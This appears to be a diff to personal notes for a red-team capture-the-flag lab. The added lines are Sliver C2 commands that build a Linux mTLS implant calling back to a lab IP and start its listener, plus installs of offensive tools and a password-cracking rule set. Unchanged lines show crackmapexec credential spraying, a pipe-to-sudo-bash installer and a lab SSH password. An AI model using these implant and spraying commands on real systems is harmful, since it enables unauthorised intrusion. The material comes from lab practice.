@@ -55,7 +55,9 @@ crackmapexec <proto> 10.200.121.0/24 -u '' -p ''
 
 Silver and EDR bypassing Scarecrow
 ```go
-
+// For VPN
+sliver > generate --mtls 10.50.114.111:11011 --arch amd64 --os linux --save /home/kali/RedTeamCapStoneChallenge/VPN-upgrade
+mtls -L 10.50.114.111 -l 11011
 
 ```
 
@@ -86,7 +88,7 @@ cracken -c '!@#$%^' -w password_base_list.txt '?w' -o smart-passwds.txt
 ```bash
 curl https://sliver.sh/install|sudo bash
 
-sudo apt install thunderbird -y
+sudo apt install thunderbird remmina certipy-ad -y
 # Authenicate
 # ssh e-citizen@10.200.121.250 - stabilitythroughcurrency
 thunderbird
@@ -97,4 +99,7 @@ git clone https://github.com/r3nt0n/bopscrk.git
 cd bopscrk;
 pip3 install -r requirements.txt
 python3 bopscrk.py -i
+
+cd ~/RedTeamCapstoneChallenge
+curl -L https://raw.githubusercontent.com/NotSoSecure/password_cracking_rules/master/OneRuleToRuleThemAll.rule -o OneRuleToRuleThemAll.rule  
 ```
